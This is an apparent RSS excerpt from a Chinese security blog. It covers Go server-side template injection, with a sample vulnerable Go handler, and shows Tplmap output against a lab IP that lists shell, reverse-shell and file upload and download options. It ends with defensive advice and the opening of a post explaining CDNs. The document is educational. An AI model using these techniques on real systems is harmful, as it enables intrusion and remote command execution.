&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;.&amp;#125;&amp;#125; 表示当前对象，如user对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;.FieldName&amp;#125;&amp;#125; 表示对象的某个字段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;range …&amp;#125;&amp;#125;&amp;#123;&amp;#123;end&amp;#125;&amp;#125; go中for…range语法类似，循环&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;with …&amp;#125;&amp;#125;&amp;#123;&amp;#123;end&amp;#125;&amp;#125; 当前对象的值，上下文&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;if …&amp;#125;&amp;#125;&amp;#123;&amp;#123;else&amp;#125;&amp;#125;&amp;#123;&amp;#123;end&amp;#125;&amp;#125; go中的if-else语法类似，条件选择&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;xxx | xxx&amp;#125;&amp;#125; 左边的输出作为右边的输入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;template &amp;quot;navbar&amp;quot;&amp;#125;&amp;#125; 引入子模版&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

在go中检测 SSTI 并不像发送 &amp;#123;&amp;#123;7*7&amp;#125;&amp;#125; 并在源代码中检查 49 那么简单，我们需要浏览文档以查找仅 Go 原生模板中的行为，最常见的就是占位符&lt;/code&gt; .`&lt;/p&gt;
&lt;p&gt;在 template 中，点 &amp;quot;.&amp;quot; 代表当前作用域的当前对象，它类似于 java/c++ 的 this 关键字，类似于 perl/python 的 self&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;net/http&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;text/template&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type User struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ID       int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Name  string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Email    string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Password string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    user := &amp;amp;User&amp;#123;1,&amp;quot;John&amp;quot;, &amp;quot;test@example.com&amp;quot;, &amp;quot;test123&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.ParseForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tpl := `&amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123; .Name &amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; . &amp;#125;&amp;#125;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data := map[string]string&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Name&amp;quot;:  user.Name,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Email&amp;quot;: user.Email,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html := template.Must(template.New(&amp;quot;login&amp;quot;).Parse(tpl))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html.Execute(w, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server := http.Server&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Addr: &amp;quot;127.0.0.1:8888&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    http.HandleFunc(&amp;quot;/string&amp;quot;, StringTpl2Exam)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server.ListenAndServe()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出为&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;模板内容 &amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123; .Name &amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; . &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;期待输出 &amp;lt;h1&amp;gt;Hi, John&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is map[Email:test@example.com Name:John]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到结构体内的都会被打印出来，我们也常常利用这个检测是否存在 SSTI&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTlLckNwNW4tSkljeGFLYUdYal9yUQ==&#34;&gt;浅学 Go 下的 ssti (qq.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最后在放上我的&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9uYW90dS5iYWlkdS5jb20vZmlsZS82Y2M1MDkzY2VkMzI2OTZmYmRkZTYyYzRiYmNhNGIxMg==&#34;&gt;新建脑图 - 百度脑图 (baidu.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;tplmap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tplmap&#34;&gt;#&lt;/a&gt; Tplmap&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS90cGxtYXA=&#34;&gt;https://github.com/epinna/tplmap&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pip install PyYaml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@kali:/mnt/hgfs/共享文件夹/tplmap-master# python tplmap.py -u &amp;quot;http://192.168.1.10:8000/?name=Sea&amp;quot;                             //判断是否是注入点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Tplmap 0.5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Automatic Server-Side Template Injection Detection and Exploitation Tool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Testing if GET parameter &amp;#x27;name&amp;#x27; is injectable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Smarty plugin is testing rendering with tag &amp;#x27;*&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Smarty plugin is testing blind injection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Mako plugin is testing rendering with tag &amp;#x27;$&amp;#123;*&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Mako plugin is testing blind injection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Python plugin is testing rendering with tag &amp;#x27;str(*)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Python plugin is testing blind injection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Tornado plugin is testing rendering with tag &amp;#x27;&amp;#123;&amp;#123;*&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Tornado plugin is testing blind injection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Jinja2 plugin is testing rendering with tag &amp;#x27;&amp;#123;&amp;#123;*&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Jinja2 plugin has confirmed injection with tag &amp;#x27;&amp;#123;&amp;#123;*&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Tplmap identified the following injection point:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  GET parameter: name                //说明可以注入，同时给出了详细信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Engine: Jinja2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Injection: &amp;#123;&amp;#123;*&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Context: text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  OS: posix-linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Technique: render&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Capabilities:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Shell command execution: ok           //检验出这些利用方法对于目标环境是否可用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Bind and reverse shell: ok&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   File write: ok&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   File read: ok&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Code evaluation: ok, python code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Rerun tplmap providing one of the following options:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                                  //可以利用下面这些参数进行进一步的操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --os-shell				Run shell on the target&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --os-cmd				Execute shell commands&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --bind-shell PORT			Connect to a shell bind to a target port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --reverse-shell HOST PORT	Send a shell back to the attacker&amp;#x27;s port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --upload LOCAL REMOTE	Upload files to the server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --download REMOTE LOCAL	Download remote files&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;ssti-的防护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-的防护&#34;&gt;#&lt;/a&gt; SSTI 的防护&lt;/h2&gt;
&lt;p&gt;(1) 和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制。&lt;br&gt;
(2) 减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/11/27/CDN/</guid>
            <title>CDN&amp;DNS</title>
            <link>http://example.com/2022/11/27/CDN/</link>
            <pubDate>Sun, 27 Nov 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;cdn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cdn&#34;&gt;#&lt;/a&gt; CDN&lt;/h1&gt;
&lt;h2 id=&#34;0x00-cdn概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x00-cdn概述&#34;&gt;#&lt;/a&gt; 0x00 CDN 概述&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;CDN&lt;/strong&gt; 英文全称 &lt;code&gt;Content Delivery Network&lt;/code&gt; ，中文翻译即为&lt;strong&gt;内容分发网络&lt;/strong&gt;。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。&lt;/p&gt;
&lt;p&gt;CDN 这个技术其实说起来并不复杂，最初的核心理念，就是&lt;strong&gt;将内容缓存在终端用户附近&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;具体来说，CDN 就是采用更多的缓存服务器（CDN 边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求。&lt;/p&gt;
&lt;p&gt;镜像服务器是源内容服务器的完整复制。而 CDN，是部分内容的缓存，智能程度更高。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CDN = 更智能的镜像 + 缓存 + 流量导流&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;0x01-cdn应用场景&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-cdn应用场景&#34;&gt;#&lt;/a&gt; &lt;strong&gt;0x01 CDN 应用场景&lt;/strong&gt;&lt;/h2&gt;
&lt;h6 id=&#34;1-网站站点应用加速&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-网站站点应用加速&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1、网站站点 / 应用加速&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;站点或者应用中大量静态资源的加速分发，建议将站点内容进行动静分离，动态文件可以结合云服务器 ECS，静态资源如各类型图片、html、css、js 文件等，建议结合 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9wcm9kdWN0L2Nvcz9mcm9tPTEwNjgw&#34;&gt;对象存储&lt;/span&gt; OSS 存储海量静态资源，可以有效加速内容加载速度，轻松搞定网站图片、短视频等内容分发。&lt;/p&gt;
&lt;h6 id=&#34;2-视音频点播大文件下载分发加速&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-视音频点播大文件下载分发加速&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2、视音频点播 / 大文件下载分发加速&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;支持各类文件的下载、分发，支持在线点播加速业务，如 mp4、flv 视频文件或者平均单个文件大小在 20M 以上，主要的业务场景是视音频点播、大文件下载（如安装包下载）等，建议搭配对象存储 OSS 使用，可提升回源速度，节约近 2/3 回源带宽成本。&lt;/p&gt;
&lt;h6 id=&#34;3-视频直播加速&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-视频直播加速&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3、视频直播加速&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;视频流媒体直播服务，支持媒资存储、切片转码、访问鉴权、内容分发加速一体化解决方案。结合弹性伸缩服务，及时调整服务器带宽，应对突发访问流量；结合媒体转码服务，享受高速稳定的并行转码，且任务规模无缝扩展。&lt;/p&gt;
&lt;h6 id=&#34;4-移动应用加速&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-移动应用加速&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4、移动应用加速&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;移动 APP 更新文件（apk 文件）分发，移动 APP 内图片、页面、短视频、UGC 等内容的优化加速分发。提供 httpDNS 服务，避免 DNS 劫持并获得实时精确的 DNS 解析结果，有效缩短用户访问时间，提升用户体验。&lt;/p&gt;
&lt;h2 id=&#34;0x01-cdn网络的组成&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-cdn网络的组成&#34;&gt;#&lt;/a&gt; 0x01 CDN 网络的组成&lt;/h2&gt;
&lt;p&gt;一个 CDN 网络主要由以下几部分组成：内容缓存设备、内容分发管理设备、本地负载均衡交换机、GSLB 设备和 CDN 管理系统，其网络结构如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20130609113946968&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内容缓存设备 Cache&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;用于缓存内容实体和对缓存内容进行组织和管理。当有用户访问该客户内容时，直接由各缓存服务器响应用户的请求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内容分发管理设备&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;主要负责核心 Web 服务器内容到 CDN 网络内缓存设备的内容推送、删除、校验以及内容的管理、同步。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GSLB 设备&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;则实现 CDN 全网各缓存节点之间的资源负载均衡，它与各节点的 SLB 设备保持通信，搜集各节点缓存设备的健康状态、性能、负载等，自动将用户指引到位于&lt;strong&gt;其地理区域中的最近服务器&lt;/strong&gt;或者引导用户&lt;strong&gt;离开拥挤的网络和服务器&lt;/strong&gt;。还可以通过使用多站点的内容和服务来提高容错性和可用性，防止因本地网或区域网络中断、断电或自然灾害而导致的故障。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不用 CDN 技术时，使用 GSLB 设备可以为用户选择最合适的服务器，但受 Web 服务器的负荷和传输距离等因素的影响，响应速度依然经常不能满足用户的需求。这一问题的解决方案就是在传输网络上利用缓存技术使得 Web 服务数据流能够就近访问。内容分发网络（CDN）正是这种思想的一个实现，CDN 使用 GSLB 设备将用户引导到最合适的缓存节点（距离近，负载低），使得用户在访问静态内容时获得更好的体验。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;CDN 管理系统&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;实现对全网设备的管理，对系统的配置。它不仅能对系统中的各个设备进行实时监控，对各种故障产生相应的告警，还能实时观测到系统中总的流量以及各节点的流量，并保存在系统的数据库中，作为统计分析的基础数据，并对日志文件进行管理、报告，作为计费的基础数据。&lt;/p&gt;
&lt;h2 id=&#34;0x02-cdn-原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-cdn-原理&#34;&gt;#&lt;/a&gt; 0x02 CDN 原理&lt;/h2&gt;
&lt;h3 id=&#34;cdn-解析流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cdn-解析流程&#34;&gt;#&lt;/a&gt; CDN 解析流程&lt;/h3&gt;
&lt;p&gt;如果某个用户想要访问优酷的视频点播内容，那么：&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125204154043.png&#34; alt=&#34;image-20221125204154043&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;blockquote&gt;
&lt;p&gt;①、当用户点击 APP 上的内容，APP 会根据 URL 地址去&lt;strong&gt;本地 DNS&lt;/strong&gt;（域名解析系统）寻求 IP 地址解析。&lt;/p&gt;
